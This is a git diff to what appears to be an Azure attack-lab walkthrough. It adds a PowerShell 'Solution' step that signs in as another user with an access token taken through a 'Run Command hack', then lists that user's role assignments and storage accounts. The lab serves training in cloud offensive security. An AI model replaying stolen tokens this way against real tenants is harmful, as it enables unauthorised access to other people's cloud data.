@@ -200,6 +200,26 @@ $roleAssignments | ForEach-Object {
     <summary><b>Solution</b></summary>
     
 ```powershell
+
+# Recon as that user and see what he has access to..
+$at = "eyJ"... # what you've obtained from the Run Command hack
+$userUPN = "user1@YOURDOMAIN.onmicrosoft.com" # you can get it from the access token if you'll parse in https://jwt.io
+$tenantId = "YOUR_TENANT_ID" # you can get it here https://entra.microsoft.com/#view/Microsoft_AAD_IAM/TenantOverview.ReactView
+
+
+Connect-AzureAD -AccountId $userUPN -TenantId $tenantId -AadAccessToken $at
+Connect-AzAccount -AccountId $userUPN -TenantId $tenantId -AccessToken $at 
+
+
+# List current user's Azure Role Assignments using Azure PowerShell
+
+$userObjectId = "686ebf9d-25..." # get it by parsing the JWT token and looking for the 'oid' field
+$roleAssignments = Get-AzRoleAssignment -ObjectId $userObjectId
+$roleAssignments | ForEach-Object {
+    Write-Output "Role: $($_.RoleDefinitionName) - Scope: $($_.Scope)"
+}
+
+# We can see that there's a storage account that this user has access to..
 # Get all storage accounts
 $storageAccounts = Get-AzStorageAccount
 
